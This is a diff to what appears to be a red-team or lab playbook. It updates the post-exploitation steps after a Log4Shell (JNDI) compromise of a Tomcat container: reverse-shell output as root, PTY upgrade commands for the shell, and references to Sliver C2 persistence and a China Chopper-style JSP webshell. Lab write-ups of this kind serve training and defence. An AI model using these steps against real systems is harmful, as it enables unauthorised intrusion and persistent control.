@@ -279,22 +279,23 @@ curl -s http://10.0.0.100:8080/ \
 **Back in Terminal 1 — shell appears within 2-3 seconds:**
 ```
 connect to [10.0.0.5] from (UNKNOWN) [10.0.0.100] XXXXX
-/bin/sh: can't access tty; job control turned off
-/ #
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+root@web01:/#
 ```
 
 **Verify your position:**
 ```bash
 [WEB01]
 id
-# uid=0(root) gid=0(root) groups=0(root),...
+# uid=0(root) gid=0(root) groups=0(root)
 whoami
 # root
 hostname
 # web01
 ```
 
-> The container runs as **root** (not `www-data`). Alpine Linux, no Python, no bash.
+> The container runs as **root**. Ubuntu 22.04 — bash available, Python not installed.
 
 **Forensic artifact created (irreversible):** Tomcat access log writes the raw `${jndi:}` string:
 ```
@@ -337,14 +338,29 @@ beacon (persistent C2 via Sliver HTTPS). Both survive the reverse shell dying.
 
 ### 2.1 Stabilize the Reverse Shell
 
-WEB01 is a minimal Alpine container — no Python, no `script`, no bash. A proper PTY upgrade
-is not possible. The raw shell works fine for the handful of commands needed in this phase.
-**Sliver C2 (§2.3) replaces the reverse shell entirely and provides full interactivity.**
+WEB01 is Ubuntu 22.04 — bash is available but Python is not installed. Use `script` to upgrade:
 
-Two things to keep in mind with the dumb shell:
-- **Do not press Ctrl+C** — it kills the nc connection. Use `Ctrl+\` to send SIGQUIT or just
-  avoid signals altogether.
-- Pipes and semicolons work normally: `id; whoami; hostname`
+```bash
+[WEB01 — raw reverse shell]
+script -qc /bin/bash /dev/null
+# Press Ctrl+Z
+```
+
+```bash
+[KALI]
+stty raw -echo
+fg
+# Press Enter once
+```
+
+```bash
+[WEB01 — proper PTY]
+export TERM=xterm
+stty rows 50 cols 200
+```
+
+**Sliver C2 (§2.3) replaces the reverse shell** and provides full interactivity — the PTY upgrade
+is optional if you plan to move to C2 immediately.
 
 ### 2.2 Deploy JSP Webshell (China Chopper Pattern)
 
